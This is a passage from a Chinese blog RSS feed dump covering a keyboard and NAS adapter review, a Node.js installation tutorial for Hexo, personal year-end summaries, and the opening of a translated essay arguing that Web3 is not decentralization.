src=\"https://cdn.sspai.com/2022/02/17/847ddf26798233fccc66d85a1d8fb995.png\"><figcaption>不喜欢浅灰色的我，最后只能考虑咸鱼版</figcaption></figure><p>忍受不了 Windows 11 Bug 和卡顿的我把工作机器从台式机变成了 M1 Pro MacBook，但日常使用中出现了两个小情况，一来是我的 Keychron K4 没办法在重启后第一次解锁的时候输入密码，必须要在笔记本内置键盘上输入；另外一点就是笔记本放得有点远，使用 TouchID 的时候胳膊要伸很远才够得到。这两个问题其实普通款的用 Magic Keyboard 就能解决，不过我为了图省事（指 Touch ID）还是决定从咸鱼上买了个蓝色 iMac 的拆机键盘。</p>\n<p>结果那段时间我派又发了把定制的 K3，再加上自己之前有的，莫名其妙突然就有了 5 把键盘。单独聊键盘我又不是很专业，所以趁着这次新玩意的机会一起聊聊这些键盘好了。这五款键盘分别是 ：</p>\n<ul>\n<li>Keychron K4 V2（佳达隆茶轴）</li>\n<li>Keychron K3 少数派定制款（佳达隆矮茶轴）</li>\n<li>带 Touch ID 的 Magic Keyboard （剪刀薄膜键盘）</li>\n<li>MacBook Pro M1 Pro（剪刀薄膜键盘）</li>\n<li>Surface Go 键盘盖（薄膜键盘）</li>\n</ul>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c87115lb34taavnbc4k0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c87115tb34ta9bscr3s0.jpeg\" alt=\"\"></figure><p>Keychron 的两把都是机械键盘，也用的是佳达隆的轴体，区别在于 K4 是标准茶轴 K3 则是矮茶。首先聊聊我已经用了一年多的 K4，K4 是一把紧凑型的带小数字键盘的 100 键键盘，当时挑选 K4 就是冲着几乎全功能的键盘去的；虽然我买的茶轴是段落轴，但整体的段落感并不强，不仔细注意的话感觉就像是直上直下的线性轴一样，但越到底部按下的手感越不同，打字时能带来的与众不同「反馈感」；佳达隆茶轴按下所需要的力度也不算大，打字时就真的不累手。不过，K4 在打字时的声音不算特别小，这可能和顺滑程度有关；此外 K4 在按键边角处轻轻按压时会有明显的形变，这会影响到使用时的手感，使用时总会让人感觉松松垮垮的生怕误触或是没有按到。但总的来说 K4 表现我还是满意的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87116db34ta9bscr3sg.jpeg\"></figure><p>K3 虽然我才用了 2 周左右，但它解决了我上面提及的 K4 茶轴的问题，所有的按键甚至包括长空格稳定性都非常好，按到了就是按到了，再加上矮茶和茶轴类似的低段落感和「反馈感」，因此这款键盘被不少同事评价：「越用越上瘾」。在我的实际使用中，K3 按下需要的力度会比 K4 要求的大一点，但按到底的距离会比 K4 短不少，发出的声音也小不少。总的来说，如果想要在薄膜键盘和标准按键行程的机械键盘中间找一个折衷的手感，那么矮轴一定能给你一个新奇的打字体验。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c87116lb34ta9bscr3t0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c871175b34ta9887656g.jpeg\" alt=\"\"></figure><p>MacBook 系列曾经使用过一段时间的蝴蝶键盘，先抛开褒贬不一的手感不谈，蝴蝶键盘容易坏是大家公认的事实，所以 Apple 从 MacBook Pro 16 inch 开始就又从蝴蝶键盘换回了剪刀式薄膜键盘，而外置的妙控键盘则一直是剪刀式薄膜键盘没有变过。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：MacBook Pro 键盘，右：带有触控 ID 的妙控键盘\"><img src=\"https://cdn.sspai.com/editor/u_/c87117db34taavnbc4kg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c87117tb34taatkrm20g.jpeg\" alt=\"\"></figure><p>作为一款薄膜键盘，它按下时没有任何阻力、回弹也非常迅速，整个键盘会给我的第一反应就是跟手。而剪刀式薄膜键盘的第二优点就是按键稳定性可以做得非常好，指尖用力去推键帽键帽也几乎纹丝不动；更稳定的键帽意味着打字时能更准确地「反馈」出你按下了某个键。最后，再加上非常舒服的按键手感和很小的按键声，这两把键盘总能够带来最纯粹的打字体验。虽然都是妙控键盘，但 MacBook 内置的键盘的手感和独立的妙控键盘相比还是略有不同的。相比之下，Mac 内置的键程会相对更短一点，按下的手感上内置键盘也表现得更干脆些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c871185b34taatkrm210.jpeg\"></figure><p>最后，再来聊聊 Surface 键盘盖，Surface 键盘盖是和 Surface 一起从公司那边拿来试试 Windows 11 的触摸体验的，不过这个键盘盖的打字手感真的好，写起文章来应该是我最喜欢的键盘了，即使不是「通用」的外接键盘我也想在这里聊聊这款键盘。它同样也是剪刀式薄膜键盘，不过它敲击起来反馈感会比妙控键盘好上不少，而且反馈也更干脆，不会像妙控键盘一样有点「肉」，有种在用光电轴的感觉，不过键程短了不少。另外我还注意到 Surface 键盘盖的最薄地方其实是和外置式妙控键盘最薄的地方是一样厚的，所以理论上这两块键盘是目前为止我用到的最舒服也是最薄的薄膜键盘了。如果下次我还会买 Surface 系列的话，我一定还是会选择支持键盘盖系列。</p>\n<h2>@Lincoln: QNAP 双 2.5 吋转单 3.5 吋 SATA 硬盘转接盒</h2>\n<ul>\n<li>入手价格：500 元</li>\n<li>入手渠道：京东</li>\n</ul>\n<p>最近我 NAS 里的一块硬盘出现了多个坏块，而一直以来那块硬盘在我 QNAP 中用作没有保护的存储池。之所以用单盘做系统盘有两个原因：</p>\n<ul>\n<li>安装应用的存储池（和所在的硬盘）会持续读写数据，高负载下性能会有一定的损耗，所以将系统和软件单独放在一个存储池有助于保证性能</li>\n<li>专门存放数据的存储池出现数据错误时，检查文件系统时所有应用程序都无法使用，重建和清洗 RAID 时也会被影响。</li>\n</ul>\n<p>这次系统盘出现坏块，自然需要替换掉整块硬盘，也就意味着必须要停机维护。此外，这次还发现 QNAP 的快照并不会记录卷里的包含的应用和对应的设置，所以软件都要重装且重新设置。当时想得很美好，结果现在给自己埋坑里了。好在 QNAP 官方提供了一个 QDA-A2AR，通过这个配件可以将两个 2.5 吋转转换为 3.5 吋 SATA 硬盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87118lb34ta9bscr3tg.png\"></figure><p>到货的速度很快，而我很清楚 2.5 吋 HDD 就没靠谱的，所以我就拿了手边装机还剩下的 2 块 2T 的 SSD 装了进去，但螺丝是真的难拧，花了好一番功夫才完整装上。另外，这个转接盒也并不能取代 NAS 内原本的 3.5 吋硬盘盒，使用的时候还需要把这转接盒装到 3.5 吋硬盘盒里才行。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87118tb34taatkrm21g.jpeg\"></figure><p>当然，这个转接盒还自带一个硬件 RAID，默认使用的是 RAID 1 模式，根据我的使用情况要求来说这样系统盘即使挂掉了一块还可以从另外一块恢复数据。不过 4 个硬盘型号的朋友，指望通过这个转接盒使用 Qtier 的朋友可能就要失望了，根据官方的说法：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c871195b34ta9bscr3u0.png\"></figure><p>装好开机 NAS，可以在 QNAP 的存储与快照总管里看到这个转接盒和里面安装的硬盘以及它们分别对应的信息。不过，我安装的并不是 QNAP 官方测试过的 SSD，所以有不少功能无法使用，包括了 Trim 和 SMART 自检。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87119db34ta98876570.png\"></figure><p>依然由于转接盒的关系，除了 Qtier 功能以外，QNAP 系统内置的 SSD 分析工具也无法使用，不过好在高速缓存加速功能还是可以正常使用，所以有加速需求的朋友依然可以考虑购买这一转接盒。</p>\n<p>最后这个转接盒还有一个点需要注意，转接盒管理需要在外部存储设备管理中进行，包括转接盒固件升级以及转接盒 RAID 重新同步，别走错地方了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87119lb34ta9887657g.png\"></figure><hr>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<ul>\n<li>获取 Matrix 社区写作权限并签署 <a href=\"https://sspai.com/post/57192\" target=\"_blank\">Matrix 共创计划 </a>；</li>\n<li>新发布一篇文章，在标题中标注「新玩意」前缀；</li>\n<li>用至少 800 字介绍产品，并配上 2-3 张产品的实拍图片；</li>\n<li><strong>在网站个人信息中补充支付宝账号。</strong></li>\n</ul>\n<p>成功入选本栏目还可以得到 108 元的「剁手红包」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺 </a>🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71502"},{"title":"处理器简史 03 | 红蓝厂亦敌亦友，蓝巨人失算踉跄","date":"2022-02-17 09:06:51","description":"\n<p>[......]</p>\n<p>本文为会员文章，出自<a href=\"https://sspai.com/prime/precog/techod-0x09\" target=\"_blank\">《科技漫游0x09》</a>，订阅后可阅读全文。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/prime/story/sv-anecdotes-03"},{"title":"在 Windows 上快速安装 Hexo · 安装 Node.js","date":"2022-01-14 10:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h2>\n<ul>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-nodejs\">安装 Node.js</a></li>\n</ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Node.js 官网 (<a href=\"https://node.js.org/\">https://node.js.org</a>)</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/image-20220114174925675.png\" alt=\"image-20220114174925675\"></p>\n<p>下载 Node.js 安装包（推荐下载 LTS 版本）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175645.png\" alt=\"image-20220114175645642\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175750.png\" alt=\"image-20220114175749822\"></p>\n<p>勾选同意协议，点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175835.png\" alt=\"image-20220114175835742\"></p>\n<p>修改文件安装位置，点击 <code>Next</code>。（也可以不用改）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175929.png\" alt=\"image-20220114175929226\"></p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180010.png\" alt=\"image-20220114180010036\"></p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180044.png\" alt=\"image-20220114180043895\"></p>\n<p>点击 <code>Install</code> 开始安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180108.png\" alt=\"image-20220114180107827\"></p>\n<p>等待安装完成。<img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180122.png\" alt=\"image-20220114180122728\"></p>\n<p>点击 <code>Finish</code> 完成安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180206.png\" alt=\"image-20220114180206024\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>打开 <code>Git Bash</code>.</p>\n<blockquote><p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。<br>或是在开始菜单中找到 Git Bash.</p></blockquote>\n<p>输入 <code>node -v</code> 和 <code>npm -v</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180458.png\" alt=\"image-20220114180458685\"></p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-nodejs/"},{"title":"2022: 新年快乐！","date":"2021-12-31 16:00:00","description":"\n<p>转眼间，2021 年已经过去。这一年非常忙碌，以至于博客一周年的纪念来不及写，许多文章计划停留在了 To Do 里。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8D%9A%E5%AE%A2\" class=\"headerlink\" title=\"博客\"></a>博客</h2>\n<p>由于 Cloudflare Web Analytics 是在 2021 年 4 月份启用的，再加上后来又将统计代码去除，所以关于访问量的信息不可用。</p>\n<p>截止至 2021 年 12 月 31 日，博客共发布 15 篇文章，其中 2021 年发布 11 篇文章，原创文章 10 篇。</p>\n<p>目前采用 <code>LeanCloud + Waline</code> 的评论方式，自 7 月份被刷评论后将评论权限改为登录（支持 <code>GitHub</code> 登录），还有部分评论在迁移中丢失，实在抱歉。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>博客自 2021 年 1 月 13 日将主题改为 <code>Miracle</code>，这是一款简洁、轻量的单栏 Hexo 主题。</p>\n<p><code>Miralce</code> 目前的版本是 <code>2.0.1</code>，全新的版本去除 jQuery，进一步提升性能。</p>\n<p>GitHub 仓库：<a href=\"https://github.com/hifun-team/hexo-theme-miracle\">https://github.com/hifun-team/hexo-theme-miracle</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%9B%B4%E5%A4%9A\" class=\"headerlink\" title=\"更多\"></a>更多</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">=&gt; ...</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2022/"},{"title":"无垠 2021 年度总结","date":"2021-12-31 08:36:10","description":"\n<p>真是忙碌的一年啊。转眼 2021 已经过去，2022 即将到来。又到了该总结这一年的时候了。</p>\n<h1>统计数据</h1>\n<p>年度总结的第一部分仍然是一些统计数据。以下数据截止 2021 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 29,073 (<span>+0.6%</span>)，年 PV 67,688 (<span>-11.61%</span>)，日均 UV 79.65，平均停留时间 3分34秒 (<span>-13.7%</span>)，平均跳出率 55% (<span>-9.8%</span>)。一年有效文章数 1 (<span>-80%</span>)，新增评论 109 条 (<span>-54.96%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\" alt=\"\" width=\"515\" height=\"620\" class=\"aligncenter size-full wp-image-2537\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog-249x300.jpg 249w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>除了 UV 较去年提高 100 多之外，其他数据全部下滑。主要原因还是因为今年实在太过忙碌，只更新了一篇博客，评论区也没有怎么维护。不过目前已经有两篇新的文章在路上了，希望可以尽快写完吧。</p>\n<h2>个人主页</h2>\n<p>个人页总 UV 3,515 (<span>-18.12%</span>)，总 PV 3,929 (<span>-4.56%</span>)，日均 UV 9.63，平均停留时间 55秒 (<span>-12.7%</span>)。访问的主要来源是知乎和 GitHub。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\" alt=\"\" width=\"515\" height=\"647\" class=\"aligncenter size-full wp-image-2538\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton-239x300.jpg 239w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>仍然是没有更新个人主页的一年，我也没有继续宣传这个页面，统计数据下滑大概是正常的。</p>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 4 次，新增 149 commits (<span>-54.57%</span>)，Star 数增加了 174，现有 788。</p>\n<p>终于，MDx 2.0 发布了。但是因为今年的过于忙碌，MDx 并没有得到足够的维护，版本发布周期也拉得比较长，很多 Bug 没能及时修复。希望明年可以把更多的时间花在维护 MDx 上。无论如何，还是感谢各位对于 MDx 的支持！</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>2021 大事记</h1>\n<p>说起来，2021 真的太多“第一次”了...</p>\n<ul>\n<li>一月：由于电脑电池鼓包，第一次用 iPad 外接屏幕远程桌面到服务器来考期末🌚太痛苦了</li>\n<li>一月：MDx 喜提 600 Stars</li>\n<li>三月：第一次测核酸（真的酸）</li>\n<li>三月：第一次坐上 A350！(B-309W）</li>\n<li>三月：第一次来到英国</li>\n<li>六月：第一次来到伦敦</li>\n<li>六月：第一次去猫咖撸猫🐱</li>\n<li>六月：第一次坐上 B777！(B-2025）</li>\n<li>七月：酒店隔离十四天🌚</li>\n<li>七月：MDx 喜提 700 Stars</li>\n<li>七月：第一次和猫一起住（时刻有猫撸真的爽😆）</li>\n<li>七月：入职<a href=\"https://75.team/\">奇舞团</a>实习</li>\n<li>八月：北京景点怎么这么多</li>\n<li>九月：北京景点怎么还有这么多</li>\n<li>九月：<a href=\"https://flyhigher.top/develop/2160.html\">谈谈 WebAuthn</a> 被 <a href=\"https://weibo.com/1893751011/KyipM3tOM\" rel=\"noopener noreferrer\">w3c中国微博转发</a><del>（虽然并没有人看）</del>\n</li>\n<li>九月：从奇舞团<del>跑路</del>\n</li>\n<li>九月：整了个 Stackoverflow 的复制粘贴键盘<del>，太好用了</del>\n</li>\n<li>十月：终于买了心心念念的 MSFS</li>\n<li>十一月：终于买了一台新相机</li>\n<li>十一月：第一次坐上 A380！(B-6140）</li>\n<li>十二月：第一次来到爱丁堡并和 <a href=\"https://diygod.me/\">@DIYgod</a> 面基</li>\n</ul>\n<section><div class=\"set-images-div\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\" alt=\"和猫一起住的唯一问题就是手机很快会被猫片塞满\" width=\"730\" height=\"1500\" class=\"aligncenter size-full wp-image-2518\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg 730w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-146x300.jpg 146w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-498x1024.jpg 498w\" sizes=\"(max-width: 730px) 100vw, 730px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\" alt=\"看到你在写前端，猫猫很担心你\" width=\"1004\" height=\"1500\" class=\"aligncenter size-full wp-image-2523\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg 1004w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-201x300.jpg 201w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-685x1024.jpg 685w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-768x1147.jpg 768w\" sizes=\"(max-width: 1004px) 100vw, 1004px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\" alt=\"高效开发工具（确信\" width=\"1500\" height=\"1019\" class=\"aligncenter size-full wp-image-2519\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-300x204.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-1024x696.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-768x522.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\" alt=\"和 Ralph 在天坛\" width=\"947\" height=\"1500\" class=\"aligncenter size-full wp-image-2524\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg 947w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-189x300.jpg 189w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-646x1024.jpg 646w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-768x1216.jpg 768w\" sizes=\"(max-width: 947px) 100vw, 947px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\" alt=\"380!\" width=\"1500\" height=\"874\" class=\"aligncenter size-full wp-image-2517\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-300x175.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-1024x597.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-768x447.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a>\n</div>\n<div class=\"set-images-div2\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\" alt=\"到处玩.jpg\" width=\"1500\" height=\"1080\" class=\"aligncenter size-full wp-image-2521\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-300x216.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-1024x737.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-768x553.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\" alt=\"还是到处玩.jpg\" width=\"977\" height=\"1500\" class=\"aligncenter size-full wp-image-2520\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg 977w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-195x300.jpg 195w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-667x1024.jpg 667w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-768x1179.jpg 768w\" sizes=\"(max-width: 977px) 100vw, 977px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\" alt=\"380 上的星空\" width=\"1002\" height=\"1500\" class=\"aligncenter size-full wp-image-2522\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg 1002w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-200x300.jpg 200w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-684x1024.jpg 684w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-768x1150.jpg 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\"></a>\n</div>\n</section><p><span>点击图片查看描述</span></p>\n<p>对了，对于可爱的猫猫们，我整了一个 Telegram 贴纸包，你可以在这里获取：<a href=\"https://telegram.me/addstickers/huanAndDan\">https://telegram.me/addstickers/huanAndDan</a>。</p>\n<h1>跨年红包</h1>\n<p>今年的解题之旅，从下面这张图片开始：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\" alt=\"\" width=\"1510\" height=\"1250\" class=\"aligncenter size-full wp-image-2556\"></a>\n<p>不过，鉴于今年的题目较以往对于认真解题的人更难，我还准备了隐藏红包，在解题中收集线索即可发现隐藏红包。共有 20 个普通红包和 10 个隐藏红包。</p>\n<p>解题计划持续到东八区 2022.02.03 23:59:59 或红包被领完为止，之后我会发布题解。不过由于去年情况混乱，今年在解题过程中我一旦发现有不正常的现象就会立即停止活动。Anyway，新年快乐！祝玩得开心。</p>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报用到了 PS 和 Adobe 家的新玩具 Dimension。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\" alt=\"\" width=\"707\" height=\"1000\" class=\"aligncenter size-full wp-image-2547\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg 1414w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-212x300.jpg 212w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-724x1024.jpg 724w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-768x1086.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-1086x1536.jpg 1086w\" sizes=\"(max-width: 707px) 100vw, 707px\"></a>\n<p>那么祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2507.html"},{"title":"[译] 不，Web3 不是去中心化","date":"2021-12-14 14:01:00","description":"\n<h2>来自译者的楔子</h2>\n<p>加密货币社区对元宇宙和 Web3 的狂热仍在继续，大量投资人和开发者前仆后继加入其中。但是，Web3 真的能实现支持者们的种种愿景吗？亦或是另一个镜中月、水中花？也许让历史照进现实，能给我们答案。<br>这是自 <a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">Web3 系列的引子之后</a>，这个系列的第一篇文章。</p>\n<blockquote><p>原文标题：Web3 is not decentralization<br>原文链接：<a href=\"https://invisibleup.com/articles/38/\">https://invisibleup.com/articles/38/</a><br>原文作者：<a href=\"https://invisibleup.com/\">InvisibleUp</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a>，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<p>不，真的。Web3 并不是去中心化。我觉得这应该很明显。我原本以为我不需要一整篇文章来阐述这个问题，但我想我确实需要。</p>\n<p>令我感到吃惊的是，像 Reddit、Twitter 和 Discord 这样的科技巨头突然决定全力投入到 NFT 中，以达到「去中心化」的目的，尤其是其中 Reddit 的做法令我尤为生气。在 <a href=\"https://www.coindesk.com/markets/2020/05/14/reddit-rolls-out-community-points-on-ethereum-to-incentivize-positive-behavior/\">2020 年 5 月</a>左右，他们在 <code>/r/FortniteBR</code> 和 <code>/r/CryptoCurrency</code> 中实验性的启动了一个「社区代币」系统，虽然我从未去过这两个 Subreddit，但我从一名 <a href=\"https://twitter.com/isyourguy/status/1457220590004158468\">来自 Reddit 的开发者的 Twitter 推文中</a> 得知，他们正在计划将 Reddit 的 Karma Point 转换为这些代币。</p>\n<blockquote><p>译者注：关于 Reddit 将 Karma 转变为 ERC-20 代币系统一事，我曾经在我的 Web3 系列文章与译文中引用过一篇 <a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">相关的新闻报道</a></p></blockquote>\n<p>在我列举的三家科技巨头中，Reddit 是走出最远的、愿景最具体的——Twitter 的为用户上传的图片添加 NFT 标签的计划依然停留在纸面上、而 Discord 在其用户的强烈反对下无限期暂停了他们的计划。因此，我在这里主要介绍 Reddit 目前已经公开的计划和路线图。简而言之，Web 1.0 是一个伟大的去中心化前沿阵地、Web 2.0 是一堆有墙的花园、有许多缺点。我完全赞同这个观点。然而，Reddit 正在加入其他公司的 Web3 的行列、准备通过分配基于以太坊的加密货币、赋予网站用户以投票权。</p>\n<p>我之后再分析这句话是什么意思，现在你只要对这句话有点印象就好了。</p>\n<h2>旧互联网上的去中心化</h2>\n<p>让我们复习一下互联网的历史，上个世纪 80 